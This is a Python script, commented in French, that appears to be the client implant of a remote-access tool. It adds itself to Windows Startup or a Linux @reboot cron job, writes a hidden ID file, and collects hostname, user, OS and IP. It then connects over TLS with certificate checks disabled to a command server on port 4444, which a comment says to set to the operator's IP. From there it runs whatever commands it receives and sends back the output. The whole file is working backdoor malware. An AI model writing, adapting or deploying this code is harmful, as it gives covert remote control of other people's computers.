import sys
import socket
import platform
import os
import json
from datetime import datetime
import time
import ssl
import uuid

SERVER_HOST = "127.0.0.1"  # remplacer par l'adresse IP du serveur
SERVER_PORT = 4444

def is_windows():
    return os.name == "nt"

def is_linux():
    return os.name == "posix"

def add_to_startup():
    script_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    shortcut_path = os.path.join(startup_folder, "AgentScript.lnk")
    
    try:
        with open(shortcut_path, "w") as shortcut:
            shortcut.write(f"python {script_path}")
    except Exception as e:
        print(f"Erreur lors de l'ajout au dossier Startup : {e}")

def create_cron_job():
    script_path = os.path.abspath(__file__)
    cron_command = f"@reboot sleep 30 && python3 {script_path}"

    try:
        cron_jobs = os.popen("crontab -l 2>/dev/null").read()

        if cron_command not in cron_jobs:
            os.system(f'(crontab -l 2>/dev/null; echo "{cron_command}") | crontab -')
            print("Tâche cron ajoutée avec succès.")
        else:
            print("La tâche cron existe déjà.")
    except Exception as e:
        print(f"Erreur lors de l'ajout de la tâche cron : {e}")

def get_or_create_uid():
    uid_file = ".agent_uid" if os.name != "nt" else "agent_uid.txt"
    if os.path.exists(uid_file):
        with open(uid_file, "r") as file:
            return file.read().strip()
    else:
        uid = str(uuid.uuid4())
        with open(uid_file, "w") as file:
            file.write(uid)
        if os.name == "nt":
            os.system(f"attrib +h {uid_file}")
        return uid

def get_system_info():
    return {
        "uid": get_or_create_uid(), 
        "hostname": socket.gethostname(),
        "system": platform.system(),
        "version": platform.version(),
        "user": os.getlogin(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "python_version": platform.python_version(),
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

def start_agent():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    context.check_hostname = False 
    context.verify_mode = ssl.CERT_NONE

    secure_client = context.wrap_socket(client, server_hostname=SERVER_HOST)

    while True:
        try:
            secure_client.connect((SERVER_HOST, SERVER_PORT))
            print("Connexion sécurisée établie avec le serveur.")
            break
        except Exception as e:
            print(f"Impossible de se connecter au serveur : {e}")
            time.sleep(5)  

    try:
        while True:
            try:
                system_info = get_system_info()

                system_info_json = json.dumps(system_info)

                secure_client.send(system_info_json.encode())

                print("Attente de 10 secondes avant de demander une commande.")
                time.sleep(10)

                secure_client.send(b"GET_COMMAND")  
                print("Commande demandée au serveur.")
                command = secure_client.recv(4096).decode()

                if command == "NO_COMMAND":
                    print("Aucune commande en attente.")
                elif command:
                    print(f"Commande reçue : {command}")

                    try:
                        output = os.popen(command).read()
                        print("Commande exécutée.")
                    except Exception as e:
                        output = f"Erreur lors de l'exécution de la commande : {e}"
                        print(f"Erreur lors de l'exécution de la commande : {e}")


                    secure_client.send(output.encode())
                    print("Résultat de la commande envoyé au serveur.")
                else:
                    print("[!] Réponse inattendue du serveur.")
            except (BrokenPipeError, ConnectionResetError):
                print("Connexion au serveur perdue. Tentative de reconnexion...")
                time.sleep(5)
                secure_client = context.wrap_socket(client, server_hostname=SERVER_HOST)
                secure_client.connect((SERVER_HOST, SERVER_PORT))
            except Exception as e:
                print(f"Erreur inattendue dans la boucle principale : {e}")
                time.sleep(5)  
    except KeyboardInterrupt:
        print("\nFermeture de la connexion.")
    finally:
        secure_client.close()
        sys.exit()

if __name__ == "__main__":
    if is_windows():
        add_to_startup()  
    elif is_linux():
        create_cron_job() 
    else:
        print("Système d'exploitation non pris en charge pour le démarrage automatique.")
        sys.exit(1)

    # Démarrer l'agent
    start_agent()